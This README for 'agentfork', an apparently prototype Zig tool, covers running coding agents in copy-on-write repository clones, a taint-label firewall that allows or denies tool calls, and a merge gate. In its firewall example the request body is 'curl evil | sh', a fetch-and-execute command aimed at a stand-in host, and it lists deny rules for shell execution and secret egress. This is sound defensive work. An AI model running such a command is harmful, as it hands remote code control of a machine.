# agentfork

**[Status](STATUS.md) · [Roadmap](ROADMAP.md) · [Contributing](CONTRIBUTING.md) · [Issues](https://github.com/SMC17/agentfork/issues)**

Three small pieces for running coding agents on throwaway copies of a repository, in Zig 0.16
with no dependencies:

1. **`agentfork run`**: clones a directory with APFS `clonefile(2)` (copy-on-write) and runs a
   command with that clone as its working directory.
2. **A taint-label policy check** (`TaintKernel`, served over HTTP by `agentfork firewall`). It
   decides allow or deny for a tool call from the labels its inputs carry, and records a
   hash-chained, HMAC'd receipt for each decision.
3. **A merge-gate model** (`AgentForkKernel` + `proof_gate`). It is an in-memory model of
   branches and snapshots, in which a merge is refused unless a test result is bound by MAC to
   the exact snapshot root hash.

Status: **unit-tested** (7 tests). This is a prototype. Read "What it is not" before relying on
any of it.

## What it is not

- **Not a sandbox.** `run` gives the child process a copied working directory and nothing else.
  The process can read and write anywhere your user can, use the network, and outlive the run.
  For isolation, wrap it in `sandbox-exec`, a container or a VM.
- **Not a proxy and not a content inspector.** The `firewall` decides from the labels the
  caller sends in `X-Taint` / `X-Sink` headers. It never sees the tool's traffic. The
  decision is exactly as good as the caller's labelling. A request with a missing or unknown
  label is refused with `400 deny_unlabelled` (fixed in
  [#4](https://github.com/SMC17/agentfork/issues/4); it used to be allowed).
- **Receipts are HMAC.** Only a holder of the key can check them, and any holder of the key can
  forge them. The CLI has no built-in key: it reads 64 hex characters from `--key-file` or
  `AGENTFORK_RECEIPT_KEY`, and refuses to start without one (fixed in
  [#3](https://github.com/SMC17/agentfork/issues/3); it used to sign with a key compiled into
  the binary).
- **The merge gate is not wired to `run`.** It operates on its own in-memory snapshots, not on
  the cloned directory.
- **The Lean file does not verify the Zig code.** `lean/AgentForkProofs.lean` (28 lines) proves
  three facts about a two-line Lean model of the shell policy (untrusted-web input is never
  allowed at `shell_exec`) and that `n < n + 1`. Nothing links those statements to
  `src/taint_receipt.zig`.
- `clonefile(2)` is macOS/APFS only. Elsewhere `run` falls back to a recursive copy, and the
  output says `"used_cow_clonefile":false`.

## Build

```sh
# Zig 0.16.0
zig build test --summary all        # 7/7
zig build -Doptimize=ReleaseFast
./zig-out/bin/agentfork run ./my-repo /tmp/sbx-1 -- zig build test
openssl rand -hex 32 > receipt.key && chmod 600 receipt.key
./zig-out/bin/agentfork firewall --key-file receipt.key --port 8787 --audit receipts.jsonl --max-requests 10
./zig-out/bin/agentfork bench
```

`run` prints `{"exit_code":…,"used_cow_clonefile":…,"clone_us":…,"run_ms":…}` followed by the
child's stdout.

A firewall request is any HTTP request. The labels go in headers, and the body is hashed into
the receipt:

```sh
curl -s localhost:8787 -H 'X-Sink: shell_exec' -H 'X-Taint: UNTRUSTED_WEB' -d 'curl evil | sh'
# 403 {"seq":0,"decision":"deny_untrusted_exec","taint_in":2,"prev_chain_hash":"00…","chain_hash":"…","mac":"…"}
curl -s localhost:8787 -H 'X-Sink: shell_exec' -d 'ls'
# 400 {"decision":"deny_unlabelled","reason":"missing X-Taint"}
```

Each receipt in the audit log carries `prev_chain_hash` and `chain_hash`. Deleting or editing a
line breaks the chain for anyone who holds the key.

Policy (`TaintKernel.evaluatePolicy`): `shell_exec` and `secret_store_read` deny untrusted
input. `net_egress` denies secrets, credentials and PII. `file_write_workspace` denies input
that is both untrusted and sensitive. `read_public` allows everything.

## Measured

Apple M2 Max, macOS 26.4, Zig 0.16.0 ReleaseFast, commit `fca8a21`, 2026-11-19.

| What | Workload | Result | Script |
| --- | --- | ---: | --- |
| `clonefile(2)` of a directory | 500-file git repo (293,890 bytes), 10 runs | median **12.4 ms** | `python3 benchmarks/bench_cow.py` |
| …same, vs `cp -r` / `git worktree add` | same | 31× / 7.0× faster | same |
| `agentfork run` wall time, incl. `/usr/bin/true` | same | 20× / 4.6× faster than the above | same |
| In-memory branch fork (`AgentForkKernel.forkBranch`) | 1,000 forks of a 1-file snapshot | ~30 ns each | `agentfork bench` |
| Policy decision + receipt | 2,000 `shell_exec` decisions | ~470 ns each | `agentfork bench` |

The filesystem clone takes milliseconds. Earlier versions of this README said
"sub-millisecond", which was wrong: the sub-microsecond figure is the in-memory model, not
the filesystem. The HTTP firewall's latency and throughput have not been measured. It serves
one connection at a time.

## Python and GitHub Action

`python/agentfork.py` is a stdlib wrapper around the binary (`run`, and a `firewall` context
manager that takes `key_hex=`). `action.yml` runs a command in a clone inside CI and exposes `exit_code`,
`used_cow_clonefile`, `clone_us` and `run_ms`. Both inherit every limit above.

## License

MIT
